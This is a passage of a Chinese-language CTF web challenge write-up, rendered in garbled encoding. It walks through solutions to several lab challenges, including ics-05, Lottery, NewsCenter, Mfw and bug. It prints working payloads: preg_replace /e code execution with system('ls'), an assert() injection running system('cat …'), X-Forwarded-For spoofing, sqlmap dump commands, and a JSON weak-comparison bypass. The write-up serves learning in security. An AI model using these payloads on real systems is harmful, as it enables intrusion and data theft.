class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;fieldset class=\"layui-elem-field layui-field-title\" style=\"margin-top: 30px;\"&gt; &lt;legend&gt;è®¾å¤‡åˆ—è¡¨&lt;/legend&gt; &lt;/fieldset&gt; &lt;table class=\"layui-hide\" id=\"test\"&gt;&lt;/table&gt; &lt;script type=\"text/html\" id=\"switchTpl\"&gt; &lt;!-- è¿™é‡Œçš„ checked çš„çŠ¶æ€åªæ˜¯æ¼”ç¤º --&gt; &lt;input type=\"checkbox\" name=\"sex\" value=\"&#123;&#123;d.id&#125;&#125;\" lay-skin=\"switch\" lay-text=\"å¼€|å…³\" lay-filter=\"checkDemo\" &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt; &lt;/script&gt; &lt;script src=\"layui/layui.js\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function() &#123; var table = layui.table, form = layui.form; table.render(&#123; elem: '#test', url: '/somrthing.json', cellMinWidth: 80, cols: [ [ &#123; type: 'numbers' &#125;, &#123; type: 'checkbox' &#125;, &#123; field: 'id', title: 'ID', width: 100, unresize: true, sort: true &#125;, &#123; field: 'name', title: 'è®¾å¤‡å', templet: '#nameTpl' &#125;, &#123; field: 'area', title: 'åŒºåŸŸ' &#125;, &#123; field: 'status', title: 'ç»´æŠ¤çŠ¶æ€', minWidth: 120, sort: true &#125;, &#123; field: 'check', title: 'è®¾å¤‡å¼€å…³', width: 85, templet: '#switchTpl', unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;/script&gt; &lt;script&gt; layui.use('element', function() &#123; var element = layui.element; //å¯¼èˆªçš„hoveræ•ˆæœã€äºŒçº§èœå•ç­‰åŠŸèƒ½ï¼Œéœ€è¦ä¾èµ–elementæ¨¡å— //ç›‘å¬å¯¼èˆªç‚¹å‡» element.on('nav(demo)', function(elem) &#123; //console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &gt; 0) &#123; die(); &#125; if (strpos($page, 'text') &gt; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt; æºç å®¡è®¡ï¼Œå¾—åˆ°å¦‚ä¸‹å¯èƒ½å­˜åœ¨é—®é¢˜çš„å…³é”®éƒ¨åˆ†ï¼š 123456789101112131415161718192021&lt;?php//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; å¯ä»¥çœ‹åˆ°preg_replaceå‡½æ•°ï¼ˆæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨preg_replaceå‡½æ•°çš„å‘½ä»¤æ‰§è¡Œæ¼æ´åœ¨â€”/eæ¨¡å¼ä¸‹ï¼ˆå³å‚æ•°patternè¾“å…¥ä¸º/eæ—¶ï¼‰å°†replacementå‚æ•°å½“ä½œPHPä»£ç æ‰§è¡Œï¼ˆphp5.5ç‰ˆæœ¬åå·²ç»åºŸå¼ƒï¼‰ï¼›**å…³äºpreg_replaceï¼šhttps://www.php.net/manual/zh/function.preg-replace.php**å…ˆæ¥æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½è¾“å‡ºå…³äºPHPé…ç½®çš„ä¿¡æ¯ï¼› æ„é€ payloadï¼š/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lwwåŒæ—¶è¿˜å¾—ä¼ªé€ X_FORWARDED_FOR=== â€˜127.0.0.1â€™ï¼› æ„é€ ï¼šéªŒè¯æˆåŠŸï¼ æ¥ä¸‹æ¥å°è¯•è¯»å–æ–‡ä»¶ç›®å½•ï¼Œåˆ©ç”¨systemï¼ˆï¼‰å‡½æ•°ï¼› æ„é€ payloadï¼š/index.php?pat=/lww/e&amp;rep=systemï¼ˆâ€œlsâ€ï¼‰&amp;sub=lww cdæŸ¥çœ‹s3chahahaDiræ–‡ä»¶system(â€œcd%20s3chahahaDir%26%26lsâ€): **%20urlè§£é‡Šä¸ºç©ºæ ¼ã€%26ä¸º&amp;** å¾—åˆ°flagæ–‡ä»¶ï¼ŒcdæŸ¥çœ‹flagæ–‡ä»¶ï¼š å¾—åˆ°flag.phpï¼Œä½¿ç”¨catæŸ¥çœ‹å†…å®¹ï¼š ics-06é¢˜ç›®æè¿°ï¼šäº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚ å®é™…æ“ä½œï¼š è¿›å…¥é¡µé¢åªæœ‰æŠ¥è¡¨ä¸­å¿ƒå¯ä»¥ç‚¹å‡»ï¼Œæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œå„ç§fuzzingï¼Œæ²¡æˆåŠŸï¼Œåæ¥æ‰çŸ¥é“ç›´æ¥çˆ†ç ´å°±è¡Œã€‚ã€‚ã€‚ çŸ¥è¯†ç‚¹è¡¥å……ï¼šå…³äºçˆ†ç ´ Lotteryï¼é¢˜ç›®åˆ†æï¼šéšä¾¿è¾“å…¥7ä¸ªæ•°å­—å¾—åˆ°ä»¥ä¸‹ç»“æœï¼Œå¹¶ä¸”æ¯æ¬¡çš„winning numberséƒ½æ˜¯ä¸åŒçš„ï¼Œåº”è¯¥ä¸ºéšæœºæ•°ï¼›æ ¹æ®Claim Your Prizeä¸­çš„æç¤ºï¼Œéœ€è¦èŠ±è´¹$9990000æ‰èƒ½ä¹°åˆ°flagï¼Œå¦‚æœä¸€ç›´çŒœæ•°å­—è·å¾—ä½™é¢ä¸å¤ªç°å®ï¼Œ å®é™…æ“ä½œ:ç”¨burpsuiteå¯¹è¾“å…¥å½©ç¥¨æ•°å­—éªŒè¯è¿‡ç¨‹æŠ“åŒ…ï¼Œå¾—åˆ°api.php; ä¸è¿‡è¿˜æ˜¯ä¸å¤ªæ¸…æ¥šæ€ä¹ˆæï¼Œçœ‹äº†ä¸‹wpï¼Œè¯´æ˜¯gitæºç æ³„éœ²ï¼šåœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚ å°è¯•è®¿é—®ï¼š å¯ä»¥åˆ©ç”¨Githackæå–ä¸‹è½½æºç ï¼›(ä½†å…¶å®æœ¬é¢˜ç›´æ¥åœ¨é™„ä»¶é‡Œç»™å‡ºäº†ç½‘ç«™æºç ã€æ»‘ç¨½.gif)æ‰“å¼€ä¹‹å‰ä¸‹è½½å¥½çš„æºæ–‡ä»¶ï¼š æ‰“å¼€api.phpæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹éªŒè¯å½©ç¥¨æ•°å­—ä»£ç ï¼š 123456789101112131415161718192021222324252627282930$win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; &#125; å¯ä»¥çœ‹åˆ°ï¼Œä»£ç å°†ç”¨æˆ·è¾“å…¥çš„7ä¸ªæ•°ä¸7ä¸ªéšæœºæ•°æ¯”è¾ƒï¼Œå¹¶ä¸”ç”¨çš„==(å¼±ç±»å‹æ¯”è¾ƒ),å› ä¸ºjsonæ”¯æŒboolæ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨trueæ¥ä½¿==æˆç«‹ï¼›æ”¹åŒ…ï¼š å‘ç°å·²ç»è·å¾—$200000;å¤šæäº¤å‡ ä½™é¢å°±å¤Ÿäº†ï¼Œbuy-&gt;flagï¼› NewsCenteré¢˜ç›®åˆ†æï¼šæ‰“å¼€é“¾æ¥ï¼Œå‡ºç°å¦‚ä¸‹é¡µé¢ï¼š[N1]:(https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG) å®é™…æ“ä½œï¼š å°è¯•æ˜¯å¦ä¸ºsqlæ³¨å…¥ï¼šæŠ“åŒ…ï¼š åˆ©ç”¨sqlmap,å‘½ä»¤ï¼šsqlmap.py -r 1.txt â€“dbs çœ‹åˆ°æœ‰ä¸€ä¸ªnewsï¼Œå‘½ä»¤ï¼šsqlmap.py -r 1.txt -D news â€“dump å¾—åˆ°flagï¼ Mfwé¢˜ç›®åˆ†æï¼šæ‰“å¼€é“¾æ¥ï¼Œå‡ ä¸ªç›®å½•éƒ½çœ‹äº†ä¸‹ï¼Œå‘ç°ï¼š å¯èƒ½å­˜åœ¨gitæºç æ³„éœ²ï¼Œå°è¯•è®¿é—®.gitç›®å½•ï¼š å®é™…æ“ä½œï¼šåˆ©ç”¨Githackå¾—åˆ°ç½‘ç«™æºç (ç›´æ¥å°†GitHack.pyæ‹–å…¥cmd,è¾“å…¥æ‰§è¡Œå‘½ä»¤)ï¼š åœ¨GitHackç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°ç½‘ç«™æºç æ–‡ä»¶å¤¹ï¼š åœ¨flag.phpä¸­åªæœ‰å¦‚ä¸‹å†…å®¹ï¼š 1234&lt;?php// TODO// $FLAG = '';?&gt; æ˜¯å°†flag.phpä¸­çš„å†…å®¹æ³¨é‡Šäº†ï¼Œä¸æ˜¾åœ¨ç½‘é¡µä¸Šã€‚ åœ¨index.phpä¸­å‘ç°å…³é”®ä»£ç ï¼š 12345678910111213&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; **assert()è¿™ä¸ªå‡½æ•°åœ¨phpè¯­è¨€ä¸­æ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ã€‚è¿”å›true or false; 1234567891011/*PHPå®˜æ–¹æ–‡æ¡£æ˜¯æ€ä¹ˆè§£é‡Šçš„ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSE PHP 5 bool assert ( mixed $assertion [, string $description ] ) PHP 7 bool assert ( mixed $assertion [, Throwable $exception ] ) assert() ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æœä¸º FALSE æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ã€‚ å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œã€‚ assertion æ˜¯å­—ç¬¦ä¸²çš„ä¼˜åŠ¿æ˜¯å½“ç¦ç”¨æ–­è¨€æ—¶å®ƒçš„å¼€é”€ä¼šæ›´å°ï¼Œå¹¶ä¸”åœ¨æ–­è¨€å¤±è´¥æ—¶æ¶ˆæ¯ä¼šåŒ…å« assertion è¡¨è¾¾å¼ã€‚ è¿™æ„å‘³ç€å¦‚æœä½ ä¼ å…¥äº† boolean çš„æ¡ä»¶ä½œä¸º assertionï¼Œè¿™ä¸ªæ¡ä»¶å°†ä¸ä¼šæ˜¾ç¤ºä¸ºæ–­è¨€å‡½æ•°çš„å‚æ•°ï¼›åœ¨è°ƒç”¨ä½ å®šä¹‰çš„ assert_options() å¤„ç†å‡½æ•°æ—¶ï¼Œæ¡ä»¶ä¼šè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œå¸ƒå°”å€¼ FALSE ä¼šè¢«è½¬æ¢æˆç©ºå­—ç¬¦ä¸²ã€‚æ–­è¨€è¿™ä¸ªåŠŸèƒ½åº”è¯¥åªè¢«ç”¨æ¥è°ƒè¯•ã€‚ ä½ åº”è¯¥ç”¨äºå®Œæ•´æ€§æ£€æŸ¥æ—¶æµ‹è¯•æ¡ä»¶æ˜¯å¦å§‹ç»ˆåº”è¯¥ä¸º TRUEï¼Œæ¥æŒ‡ç¤ºæŸäº›ç¨‹åºé”™è¯¯ï¼Œæˆ–è€…æ£€æŸ¥å…·ä½“åŠŸèƒ½çš„å­˜åœ¨ï¼ˆç±»ä¼¼æ‰©å±•å‡½æ•°æˆ–ç‰¹å®šçš„ç³»ç»Ÿé™åˆ¶å’ŒåŠŸèƒ½ï¼‰ã€‚*/ 123die() å‡½æ•°è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬ï¼›strpos(string,find,start)æŸ¥æ‰¾findåœ¨å­—ç¬¦ä¸²stringä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®;file_exists() å‡½æ•°æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•å­˜åœ¨åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ **å¦‚æ­¤è¿™èˆ¬ï¼Œå¯ä»¥åˆ©ç”¨assert()å‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œåœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ï¼Œæ„é€ urlä¸ºpage=abcâ€™) or system(â€œcat templates/flag.phpâ€);//{ç”¨lwwâ€™)é—­åˆå‰åŠéƒ¨åˆ†ï¼Œå¾—åˆ°falseï¼›ä¹‹åæ‰§è¡Œsystem();//æ³¨é‡Šæ‰åé¢çš„ä»£ç ï¼› Training-WWW-RobotsçŸ¥è¯†ç‚¹è¡¥å……ï¼š robots.txtæ˜¯ä¸€ä¸ªåè®®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚ å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚ç™¾åº¦å®˜æ–¹å»ºè®®ï¼Œä»…å½“æ‚¨çš„ç½‘ç«™åŒ…å«ä¸å¸Œæœ›è¢«æœç´¢å¼•æ“æ”¶å½•çš„å†…å®¹æ—¶ï¼Œæ‰éœ€è¦ä½¿ç”¨robots.txtæ–‡ä»¶ã€‚å¦‚æœæ‚¨å¸Œæœ›æœç´¢å¼•æ“æ”¶å½•ç½‘ç«™ä¸Šæ‰€æœ‰å†…å®¹ï¼Œè¯·å‹¿å»ºç«‹robots.txtæ–‡ä»¶ã€‚ å¦‚æœå°†ç½‘ç«™è§†ä¸ºé…’åº—é‡Œçš„ä¸€ä¸ªæˆ¿é—´ï¼Œrobots.txtå°±æ˜¯ä¸»äººåœ¨æˆ¿é—´é—¨å£æ‚¬æŒ‚çš„â€œè¯·å‹¿æ‰“æ‰°â€æˆ–â€œæ¬¢è¿æ‰“æ‰«â€çš„æç¤ºç‰Œã€‚è¿™ä¸ªæ–‡ä»¶å‘Šè¯‰æ¥è®¿çš„æœç´¢å¼•æ“å“ªäº›æˆ¿é—´å¯ä»¥è¿›å…¥å’Œå‚è§‚ï¼Œå“ªäº›æˆ¿é—´å› ä¸ºå­˜æ”¾è´µé‡ç‰©å“ï¼Œæˆ–å¯èƒ½æ¶‰åŠä½æˆ·åŠè®¿å®¢çš„éšç§è€Œä¸å¯¹æœç´¢å¼•æ“å¼€æ”¾ã€‚ä½†robots.txtä¸æ˜¯å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯é˜²ç«å¢™ï¼Œå¦‚åŒå®ˆé—¨äººæ— æ³•é˜»æ­¢çªƒè´¼ç­‰æ¶æ„é—¯å…¥è€…ã€‚ Robotsåè®®ç”¨æ¥å‘ŠçŸ¥æœç´¢å¼•æ“å“ªäº›é¡µé¢èƒ½è¢«æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½è¢«æŠ“å–ï¼›å¯ä»¥å±è”½ä¸€äº›ç½‘ç«™ä¸­æ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œå¦‚ï¼šå›¾ç‰‡ï¼ŒéŸ³ä¹ï¼Œè§†é¢‘ç­‰ï¼ŒèŠ‚çœæœåŠ¡å™¨å¸¦å®½ï¼›å¯ä»¥å±è”½ç«™ç‚¹çš„ä¸€äº›æ­»é“¾æ¥ã€‚æ–¹ä¾¿æœç´¢å¼•æ“æŠ“å–ç½‘ç«™å†…å®¹ï¼›è®¾ç½®ç½‘ç«™åœ°å›¾è¿æ¥ï¼Œæ–¹ä¾¿å¼•å¯¼èœ˜è››çˆ¬å–é¡µé¢ã€‚(æ‘˜è‡ªç™¾åº¦ç™¾ç§‘) å®é™…æ“ä½œï¼š è®¿é—®robots.txtï¼Œå‘ç°ä¸å…è®¸è®¿é—®fl0g.php å°è¯•è®¿é—®/fl0g.phpï¼Œå¾—åˆ°flagï¼› NaNNaNNaNNaN-Batmané¢˜ç›®åˆ†æï¼šä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°web100çš„æ–‡æœ¬ï¼Œæ‰“å¼€æ˜¯ä¹±ç ï¼Œå¤§æ¦‚çœ‹äº†ä¸‹ï¼Œå°†åç¼€æ”¹ä¸ºHTMLï¼Œåœ¨æµè§ˆå™¨é‡Œæ‰“å¼€ï¼Œå¾—åˆ°ä¸€ä¸ªOKè¾“å…¥æ¡†ï¼› ä½†æ˜¯è¾“å…¥æ²¡æœ‰ä»»ä½•å“åº”ï¼›å›å¤´å†çœ‹çœ‹ä»£ç ï¼› å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°,â€™â€™æ˜¯ä¸€ä¸ªå˜é‡ï¼Œè€Œå®ƒçš„å†…å®¹å°±æ˜¯åé¢ä¸€é•¿ä¸²å­—ç¬¦(ä¸‰è¡Œç»¿è‰²éƒ¨åˆ†å³â€™â€™ä¸­é—´éƒ¨åˆ†)ï¼›æœ€åeval()å‡½æ•°æ‰§è¡Œ_; **eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚**æ­¤å¤„ï¼Œeval()å¹¶æœªæ‰§è¡Œ$()å‡½æ•°ï¼Œè€Œæ˜¯æ‰§è¡Œäº†å­—ç¬¦ä¸²ï¼Œå¯¼è‡´ä¹±ç ?:).ä¸ºäº†èƒ½çœ‹åˆ°æ­£å¸¸æºç ï¼Œå°†eval()æ”¹ä¸ºalert()ï¼› **alert() æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ª OK æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚alertæ˜¯HTML DOM ä¸­ç”¨åˆ°çš„ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œå®ƒçš„ä¸­æ–‡æ„æ€æ˜¯â€œæé†’â€ã€‚å®ƒæ˜¯JavaScriptæˆ–VBscriptè„šæœ¬è¯­è¨€ä¸­çª—å£windowå¯¹è±¡çš„ä¸€ä¸ªå¸¸ç”¨æ–¹æ³•ï¼›å…¶ä¸»è¦ç”¨æ³•å°±æ˜¯åœ¨ä½ è‡ªå·±å®šä¹‰äº†ä¸€å®šçš„å‡½æ•°ä»¥åï¼Œé€šè¿‡æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œæ‰€å¼¹å‡ºå¯¹è¯æ¡†çš„è¯­è¨€ã€‚å¹¶ä¸”alertå¯¹è¯æ¡†é€šå¸¸ç”¨äºä¸€äº›å¯¹ç”¨æˆ·çš„æç¤ºä¿¡æ¯ã€‚| alert(message) | || :â€”â€”â€”â€”: | :â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“: || å‚æ•° | æè¿° || message | è¦åœ¨ window ä¸Šå¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œé HTML æ–‡æœ¬ï¼‰ |** å³ï¼š 1234567891011121314151617181920212223function $()&#123; var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null) &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ **match() æ–¹æ³•å¯åœ¨å­—ç¬¦ä¸²å†…æ£€ç´¢æŒ‡å®šçš„å€¼ï¼Œæˆ–æ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…ã€‚splice() æ–¹æ³•å‘/ä»æ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åè¿”å›è¢«åˆ é™¤çš„é¡¹ç›®ã€‚(åº”è¯¥æ˜¯ä»varåçš„å‡ ä¸ªå€¼ä¸­æŒ‘é€‰å‡ ä¸ªï¼Œç»„åˆå¾—åˆ°flag)** å®é™…æ“ä½œï¼š æ–¹æ³•ä¸€ï¼šå®¡è®¡ï¼Œå˜é‡eéœ€è¦æ»¡è¶³äº”ä¸ªæ¡ä»¶ã€‚é•¿åº¦ä¸º16ï¼›^è¡¨ç¤ºå¼€å¤´ä¸€å®šè¦åŒ¹é…åˆ°be0f23ï¼Œ$è¡¨ç¤ºç»“å°¾ä¸€å®šè¦åŒ¹é…åˆ°e98aa,å…¶å®ƒçš„åªè¦åŒ¹é…åˆ°å°±è¡Œï¼Œæ²¡æœ‰ä½ç½®è¦æ±‚ï¼›æ‰€ä»¥å¯ä»¥æ„é€ å‡ºï¼še==be0f233ac7be98aaåœ¨OKè¾“å…¥æ¡†ä¸­è¾“å…¥å¯ä»¥å¾—åˆ°flagï¼› æ–¹æ³•äºŒï¼šç”±äºç¨‹åºå·²ç»å›ºå®šåªæ˜¯åœ¨è¾“å…¥æ—¶éœ€è¦æ£€æµ‹æ˜¯å¦åŒ¹é…ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥çœå»è¾“å…¥åŒ¹é…éƒ¨åˆ†ï¼Œç›´æ¥æ‰§è¡Œå…³é”®ç»„åˆflagéƒ¨åˆ†ï¼›æå–å¦‚ä¸‹ä»£ç ï¼Œåœ¨æ§åˆ¶å°æ‰§è¡Œï¼š 123456789101112131415161718function $()&#123; var e=document.getElementById(\"c\").value; &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ bugé¢˜ç›®åˆ†æï¼šç»™å‡ºä¸€ä¸ªç™»å½•é¡µé¢;é¦–å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼› ç™»å½•ï¼› å‘ç°åªæœ‰Manageæ˜¯ä¸èƒ½æ™®é€šç”¨æˆ·ä½¿ç”¨çš„ï¼› æœ€åå‘ç°è¿˜æœ‰ä¸ªFinpwdï¼Œæ‰¾å›å¯†ç ä¹‹å‰åº”è¯¥ä¼šéªŒè¯èº«ä»½ï¼Œåº”è¯¥æ˜¯çªç ´å£ï¼› å®é™…æ“ä½œï¼šå…ˆä»¥smtsecæ‰¾å›å¯†ç ï¼Œå‘ç°ç›´æ¥ç»™äº†ä¸€ä¸ªnewpwdè¾“å…¥æ¡†ï¼›åº”è¯¥æ˜¯éœ€è¦æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·èº«ä»½ï¼› ä¿®æ”¹ä¸ºadminï¼Œæç¤ºä¿®æ”¹æˆåŠŸï¼› ä»¥adminèº«ä»½ç™»å½•æˆåŠŸï¼›ä½†æ˜¯Manageè¿˜æ˜¯ä¸èƒ½ä½¿ç”¨æç¤ºIP not allowed!åº”è¯¥è¦æ”¹ä¸ºæœ¬åœ°ç™»å½•ï¼›åœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥X-Forwarded-For: 127.0.0.1è¿›è¡Œipä¼ªé€ ï¼›å¾—åˆ°å¦‚ä¸‹é¡µé¢ï¼› æŸ¥çœ‹æºç ï¼Œçœ‹åˆ°æç¤ºï¼š çœ‹åˆ°filemanageæƒ³åˆ°å¯èƒ½doä¸ºupload(æ–‡ä»¶ç®¡ç†æ— éä¸Šä¼ ã€ä¸‹è½½ã€æŸ¥çœ‹ã€åˆ é™¤)ï¼› å…³äºæ–‡ä»¶ä¸Šä¼ ï¼šhttps://blog.csdn.net/qq_42636435/article/details/88096844 æ ¹æ®æç¤ºJust imageï¼Ÿå› è¯¥æ˜¯ä¸Šä¼ 